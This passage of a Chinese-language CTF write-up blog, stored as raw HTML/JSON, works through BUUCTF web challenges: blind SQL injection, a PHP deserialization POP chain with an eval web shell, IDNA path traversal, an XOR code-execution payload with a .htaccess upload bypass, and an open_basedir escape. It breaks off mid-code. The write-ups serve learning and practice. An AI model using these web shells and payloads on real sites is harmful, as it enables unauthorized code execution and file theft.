/message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C34%2C1%29%29%3E1 HTTP/1.1</span></span><br><span class=\"line\"><span class=\"comment\"># Content-Length: 166</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> urllib.parse <span class=\"keyword\">import</span> unquote</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">is_rigth</span><span class=\"params\">(x)</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> int(x) &gt; <span class=\"number\">4</span>:</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">False</span> </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">with</span> open(<span class=\"string\">'1.txt'</span>,<span class=\"string\">'r'</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">\tans = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\treq = file.readlines()</span><br><span class=\"line\">\tlength = req[<span class=\"number\">238</span>:<span class=\"number\">476</span>]</span><br><span class=\"line\">\treq = req[<span class=\"number\">0</span>:<span class=\"number\">238</span>]</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(req)//<span class=\"number\">7</span> - <span class=\"number\">1</span>):</span><br><span class=\"line\">\t\tnum = int(re.search(<span class=\"string\">'&gt;([0-9]&#123;2,&#125;)'</span>,unquote(req[i*<span class=\"number\">7</span>+<span class=\"number\">6</span>],<span class=\"string\">'utf-8'</span>)).group(<span class=\"number\">1</span>))</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> is_rigth(length[i*<span class=\"number\">7</span>+<span class=\"number\">6</span>][<span class=\"number\">-3</span>]):</span><br><span class=\"line\">\t\t\tans += chr(int(num+<span class=\"number\">1</span>))</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\tans += chr(int(num))</span><br><span class=\"line\">\tprint(ans)</span><br><span class=\"line\"><span class=\"comment\"># ISG&#123;BLind_SQl_InJEcTi0N_DeTEcTEd&#125;</span></span><br></pre></td></tr></table></figure>","categories":["writeup"],"tags":["CTF"]},{"title":"BUUCTF_WEB(二)","url":"/2020/09/14/buuctf1/","content":"<p>[强网杯 2019]Upload</p>\n<a id=\"more\"></a>\n<h1 id=\"强网杯-2019-Upload\"><a href=\"#强网杯-2019-Upload\" class=\"headerlink\" title=\"[强网杯 2019]Upload\"></a>[强网杯 2019]Upload</h1><p>题目流程走了一圈，没发现有什么利用点。查看cookie，发现存在base64编码的反序列化信息，所以猜测有源码泄露，扫目录发现题目存在源码泄露<code>www.tar.gz</code><br>，下载源码之后审计源码，既然题目是<code>Upload</code>，应该和上传有关，查看上传部分代码<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">upload_img</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">$this</span>-&gt;checker)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!<span class=\"keyword\">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class=\"line\">            $curr_url=<span class=\"string\">\"http://\"</span>.$_SERVER[<span class=\"string\">'HTTP_HOST'</span>].$_SERVER[<span class=\"string\">'SCRIPT_NAME'</span>].<span class=\"string\">\"/index\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;redirect($curr_url,<span class=\"number\">302</span>);</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>($_FILES))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;filename_tmp=$_FILES[<span class=\"string\">'upload_file'</span>][<span class=\"string\">'tmp_name'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;filename=md5($_FILES[<span class=\"string\">'upload_file'</span>][<span class=\"string\">'name'</span>]).<span class=\"string\">\".png\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;ext_check();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">$this</span>-&gt;ext) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(getimagesize(<span class=\"keyword\">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class=\"line\">            @copy(<span class=\"keyword\">$this</span>-&gt;filename_tmp, <span class=\"keyword\">$this</span>-&gt;filename);</span><br><span class=\"line\">            @unlink(<span class=\"keyword\">$this</span>-&gt;filename_tmp);</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;img=<span class=\"string\">\"../upload/$this-&gt;upload_menu/$this-&gt;filename\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;update_img();</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;error(<span class=\"string\">'Forbidden type!'</span>, url(<span class=\"string\">'../index'</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;error(<span class=\"string\">'Unknow file type!'</span>, url(<span class=\"string\">'../index'</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>可以看到上传之后题目都被强制修改后缀为<code>png</code>，无法执行PHP代码，所以要寻找其它漏洞点，结合前面的cookie，查找反序列化相关代码，发现在上传图片后会进行序列化操作<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">update_cookie</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;checker-&gt;profile[<span class=\"string\">'img'</span>]=<span class=\"keyword\">$this</span>-&gt;img;</span><br><span class=\"line\">        cookie(<span class=\"string\">\"user\"</span>,base64_encode(serialize(<span class=\"keyword\">$this</span>-&gt;checker-&gt;profile)),<span class=\"number\">3600</span>);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure><br>在首页存在反序列化操作<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">login_check</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    $profile=cookie(<span class=\"string\">'user'</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>($profile))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;profile=unserialize(base64_decode($profile));</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;profile_db=db(<span class=\"string\">'user'</span>)-&gt;where(<span class=\"string\">\"ID\"</span>,intval(<span class=\"keyword\">$this</span>-&gt;profile[<span class=\"string\">'ID'</span>]))-&gt;find();</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(array_diff(<span class=\"keyword\">$this</span>-&gt;profile_db,<span class=\"keyword\">$this</span>-&gt;profile)==<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>接下来尝试构造pop链<br>在<code>Profile</code>类中，存在两个魔术方法<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span><span class=\"params\">($name)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;except[$name];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span><span class=\"params\">($name, $arguments)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;&#123;<span class=\"keyword\">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br><code>__call</code>的触发需要调用不存在的方法，而在<code>Register</code>类的析构函数中<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"keyword\">$this</span>-&gt;registed)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;checker-&gt;index();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>此处调用了不存在的index方法，可以触发<code>__call</code>方法，然后<code>__call</code>方法又可以触发<code>__get</code>方法，这样，通过<code>__get</code>方法可以执行我们想要执行的函数，而在<code>Profile</code>类的<code>upload_img</code>函数正好存在利用点<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">upload_img</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">$this</span>-&gt;ext) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(getimagesize(<span class=\"keyword\">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class=\"line\">            @copy(<span class=\"keyword\">$this</span>-&gt;filename_tmp, <span class=\"keyword\">$this</span>-&gt;filename);</span><br><span class=\"line\">            @unlink(<span class=\"keyword\">$this</span>-&gt;filename_tmp);</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;img=<span class=\"string\">\"../upload/$this-&gt;upload_menu/$this-&gt;filename\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;update_img();</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;error(<span class=\"string\">'Forbidden type!'</span>, url(<span class=\"string\">'../index'</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;error(<span class=\"string\">'Unknow file type!'</span>, url(<span class=\"string\">'../index'</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>我们可以通过控制<code>$ext=1</code>是代码进入此流程，先上传恶意图片，然后利用<code>@copy($this-&gt;filename_tmp, $this-&gt;filename);</code>来修改我们上传的文件后缀名从而getshell<br><strong>攻击流程：</strong><br>先上传恶意图片文件，内容为<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">GIF89a</span><br><span class=\"line\">&lt;?php @eval($_REQUEST[&#39;snow&#39;]); ?&gt;</span><br></pre></td></tr></table></figure><br>查看网页源代码获取到该图片的存储位置，序列化代码如下<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">app</span>\\<span class=\"title\">web</span>\\<span class=\"title\">controller</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Profile</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $checker;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $filename_tmp;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $filename;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $upload_menu;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $ext;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $img;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $except;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;except = <span class=\"keyword\">array</span>(<span class=\"string\">'index'</span>=&gt;<span class=\"string\">'upload_img'</span>);</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;ext = <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;filename_tmp = <span class=\"string\">'./upload/76d9f00467e5ee6abc3ca60892ef304e/fb5c81ed3a220004b71069645f112867.png'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;filename = <span class=\"string\">'./upload/snow.php'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Register</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $checker;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $registed;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($a)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;checker = $a;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;registed = <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$a = <span class=\"keyword\">new</span> Profile();</span><br><span class=\"line\">$b = <span class=\"keyword\">new</span> Register($a);</span><br><span class=\"line\"><span class=\"comment\">//echo serialize($b);</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> base64_encode(serialize($b));</span><br></pre></td></tr></table></figure><br>替换cookie后刷新页面，访问上传的图片地址即可getshell</p>\n<h1 id=\"SUCTF-2019-Pythonginx\"><a href=\"#SUCTF-2019-Pythonginx\" class=\"headerlink\" title=\"[SUCTF 2019]Pythonginx\"></a>[SUCTF 2019]Pythonginx</h1><p>本题给出了源代码，是一个flask项目，会返回我们提交的url中的内容<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getUrl</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    url = request.args.get(<span class=\"string\">\"url\"</span>)</span><br><span class=\"line\">    host = parse.urlparse(url).hostname</span><br><span class=\"line\">    <span class=\"keyword\">if</span> host == <span class=\"string\">'suctf.cc'</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"我扌 your problem? 111\"</span></span><br><span class=\"line\">    parts = list(urlsplit(url))</span><br><span class=\"line\">    host = parts[<span class=\"number\">1</span>]</span><br><span class=\"line\">    <span class=\"keyword\">if</span> host == <span class=\"string\">'suctf.cc'</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"我扌 your problem? 222 \"</span> + host</span><br><span class=\"line\">    newhost = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> h <span class=\"keyword\">in</span> host.split(<span class=\"string\">'.'</span>):</span><br><span class=\"line\">        newhost.append(h.encode(<span class=\"string\">'idna'</span>).decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    parts[<span class=\"number\">1</span>] = <span class=\"string\">'.'</span>.join(newhost)</span><br><span class=\"line\">    <span class=\"comment\">#去掉 url 中的空格</span></span><br><span class=\"line\">    finalUrl = urlunsplit(parts).split(<span class=\"string\">' '</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">    host = parse.urlparse(finalUrl).hostname</span><br><span class=\"line\">    <span class=\"keyword\">if</span> host == <span class=\"string\">'suctf.cc'</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> urllib.request.urlopen(finalUrl, timeout=<span class=\"number\">2</span>).read()</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"我扌 your problem? 333\"</span></span><br></pre></td></tr></table></figure><br>提示我们需要读文件，先是限制了host不能是suctf.cc（如果是函数就返回了），但是后面又显示必须是suctf.cc，关键点就在<code>urlsplit</code>函数，在<a href=\"https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf\" target=\"_blank\" rel=\"noopener\">blackhat2019</a>会议上提到了此漏洞，通过inda编码的字符在进行unicode解码时会导致字符逃逸，例如<code>℀</code>会变成<code>a/c</code>，显然，这样会导致路径插入，比如<code>suctf.c℀om</code>可以变成<code>suctf.ca/com</code>，从而实现逃逸<br>回到本题，我们可以直接找一个能解码成<code>c</code>的特殊字符即可<br><img src=\"/2020/09/14/buuctf1/1.png\" alt><br>payload如下:<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">file:&#x2F;&#x2F;suctf.cⅭ&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br><span class=\"line\">file:&#x2F;&#x2F;suctf.cⅭ&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;fffffflag</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"SUCTF-2019-EasyWeb\"><a href=\"#SUCTF-2019-EasyWeb\" class=\"headerlink\" title=\"[SUCTF 2019]EasyWeb\"></a>[SUCTF 2019]EasyWeb</h1><p>题目给出了源代码<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_the_flag</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class=\"line\">    $userdir = <span class=\"string\">\"upload/tmp_\"</span>.md5($_SERVER[<span class=\"string\">'REMOTE_ADDR'</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!file_exists($userdir))&#123;</span><br><span class=\"line\">    mkdir($userdir);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>($_FILES[<span class=\"string\">\"file\"</span>]))&#123;</span><br><span class=\"line\">        $tmp_name = $_FILES[<span class=\"string\">\"file\"</span>][<span class=\"string\">\"tmp_name\"</span>];</span><br><span class=\"line\">        $name = $_FILES[<span class=\"string\">\"file\"</span>][<span class=\"string\">\"name\"</span>];</span><br><span class=\"line\">        $extension = substr($name, strrpos($name,<span class=\"string\">\".\"</span>)+<span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">\"/ph/i\"</span>,$extension)) <span class=\"keyword\">die</span>(<span class=\"string\">\"^_^\"</span>); </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(mb_strpos(file_get_contents($tmp_name), <span class=\"string\">'&lt;?'</span>)!==<span class=\"keyword\">False</span>) <span class=\"keyword\">die</span>(<span class=\"string\">\"^_^\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!exif_imagetype($tmp_name)) <span class=\"keyword\">die</span>(<span class=\"string\">\"^_^\"</span>); </span><br><span class=\"line\">        $path= $userdir.<span class=\"string\">\"/\"</span>.$name;</span><br><span class=\"line\">        @move_uploaded_file($tmp_name, $path);</span><br><span class=\"line\">        print_r($path);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$hhh = @$_GET[<span class=\"string\">'_'</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span> (!$hhh)&#123;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(strlen($hhh)&gt;<span class=\"number\">18</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'One inch long, one inch strong!'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( preg_match(<span class=\"string\">'/[\\x00- 0-9A-Za-z\\'\"\\`~_&amp;.,|=[\\x7F]+/i'</span>, $hhh) )</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'Try something else!'</span>);</span><br><span class=\"line\">$character_type = count_chars($hhh, <span class=\"number\">3</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(strlen($character_type)&gt;<span class=\"number\">12</span>) <span class=\"keyword\">die</span>(<span class=\"string\">\"Almost there!\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">eval</span>($hhh);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure><br>题目过滤了大量字符，经测试还有<code>^</code>可以用，参考p牛的方法使用异或进行代码执行，因为存在长度限制，所以使用字符数比较短的GET变量<br><strong>小知识点： 在PHP中，url 参数默认是字符串类型</strong><br>fuzz脚本：<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$s = <span class=\"string\">'_GET'</span>;</span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"string\">'%'</span>.dechex(<span class=\"number\">244</span>).<span class=\"string\">' '</span>);</span><br><span class=\"line\"><span class=\"keyword\">for</span>($j=<span class=\"number\">0</span>;$j&lt;strlen($s);$j++)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>($i=<span class=\"number\">0</span>;$i&lt;<span class=\"number\">255</span>;$i++)&#123;</span><br><span class=\"line\">        $a = chr(<span class=\"number\">244</span>)^chr($i);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($a == $s[$j])&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">'%'</span>.dechex($i);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;    </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>payload：<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$&#123;%ab%b3%b1%a0^%f4%f4%f4%f4&#125;&#123;%f4&#125;();&amp;%f4&#x3D;phpinfo</span><br></pre></td></tr></table></figure><br>由于长度受限，我们只能执行简单的函数，想要进行读文件等操作还是需要getshell，题目还给出了<code>get_the_flag</code>函数，其中存在上传功能，可以利用此函数进行文件上传，该函数存在过滤点</p>\n<ol>\n<li>后缀检测</li>\n<li>文件内容检测，文件中不得出现<code>&lt;?</code></li>\n<li>exif_imagetype</li>\n</ol>\n<p>可以通过文件上传加<code>.htaccess</code>进行绕过，代码没有表单，可以找个上传点抓包然后和本题数据包拼接一下就可以上传了，绕过2处的过滤，需要对PHP文件进行编码<br><img src=\"/2020/09/14/buuctf1/2.png\" alt><br><strong>PS:</strong>因为是base64编码，所以要保证字符长度是4的倍数，如果不够的话要自己凑一下<br><img src=\"/2020/09/14/buuctf1/3.png\" alt><br>然后访问a.ooo即可解析为PHP代码<br>当然，也可以使用脚本上传<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">r\"http://84ae465d-bec5-48bb-965b-bd7f4b51394f.node3.buuoj.cn/?_=$&#123;%ab%b3%b1%a0^%f4%f4%f4%f4&#125;&#123;%f4&#125;();&amp;%f4=get_the_flag\"</span></span><br><span class=\"line\">file1 = &#123;<span class=\"string\">'file'</span>: (<span class=\"string\">'a.ooo'</span>, <span class=\"string\">'GIF89aaa\\nPD9waHAgQGV2YWwoJF9SRVFVRVNUWyJzbm93Il0pO3BocGluZm8oKTs/Pg=='</span>)&#125;</span><br><span class=\"line\">file2 = &#123;<span class=\"string\">'file'</span>: (<span class=\"string\">'.htaccess'</span>, <span class=\"string\">'#define width 45\\n#define height 45\\nAddType application/x-httpd-php .ooo\\nphp_value '</span></span><br><span class=\"line\">    <span class=\"string\">'auto_append_file \"php://filter/convert.base64-decode/resource=a.ooo\"'</span>)&#125;</span><br><span class=\"line\">r = requests.post(url, files=file1).text</span><br><span class=\"line\">print(r)</span><br><span class=\"line\">r = requests.post(url, files=file2).text</span><br><span class=\"line\">print(r)</span><br></pre></td></tr></table></figure><br><img src=\"/2020/09/14/buuctf1/4.png\" alt><br>访问网站flag文件存在提示信息</p>\n<blockquote>\n<p>hhhh<br>This is fake flag<br>But I heard php7.2-fpm has been initialized in unix socket mode!<br>~    </p>\n</blockquote>\n<p>需要我们绕过open_basedir限制，我们可以选择绕过该限制，也可以选择直接绕过disable_functions（推荐这种方法，蚁剑有插件）</p>\n<p>payload<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">upload&#x2F;tmp_bad194011f5ad0cf609c77ad222e50d6&#x2F;a.ooo?snow&#x3D;chdir(%27img%27);ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27&#x2F;%27);var_dump(file_get_contents(%27&#x2F;THis_Is_tHe_F14g%27));</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"SUCTF-2019-Upload-Labs-2\"><a href=\"#SUCTF-2019-Upload-Labs-2\" class=\"headerlink\" title=\"[SUCTF 2019]Upload Labs 2\"></a>[SUCTF 2019]Upload Labs 2</h1><p>php://filter/resource=phar://./upload/bad194011f5ad0cf609c77ad222e50d6/b5e9b4f86ce43ca65bd79c894c4a924c.gif</p>\n<h1 id=\"De1CTF-2019-SSRF-Me\"><a href=\"#De1CTF-2019-SSRF-Me\" class=\"headerlink\" title=\"[De1CTF 2019]SSRF Me\"></a>[De1CTF 2019]SSRF Me</h1><p>题目给出源码和提示<code>flag is in ./flag.txt</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#! /usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\">#encoding=utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> request</span><br><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\">reload(sys)</span><br><span class=\"line\">sys.setdefaultencoding(<span class=\"string\">'latin1'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\">secert_key = os.urandom(<span class=\"number\">16</span>)</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Task</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, action, param, sign, ip)</span>:</span></span><br><span class=\"line\">        self.action = action</span><br><span class=\"line\">        self.param = param</span><br><span class=\"line\">        self.sign = sign</span><br><span class=\"line\">        self.sandbox = md5(ip)</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">not</span> os.path.exists(self.sandbox)):          <span class=\"comment\">#SandBox For Remote_Addr</span></span><br><span class=\"line\">            os.mkdir(self.sandbox)</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">Exec</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        result = &#123;&#125;</span><br><span class=\"line\">        result[<span class=\"string\">'code'</span>] = <span class=\"number\">500</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (self.checkSign()):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">\"scan\"</span> <span class=\"keyword\">in</span> self.action:</span><br><span class=\"line\">                tmpfile = open(<span class=\"string\">\"./%s/result.txt\"</span> % self.sandbox, <span class=\"string\">'w'</span>)</span><br><span class=\"line\">                resp = scan(self.param)</span><br><span class=\"line\">                <span 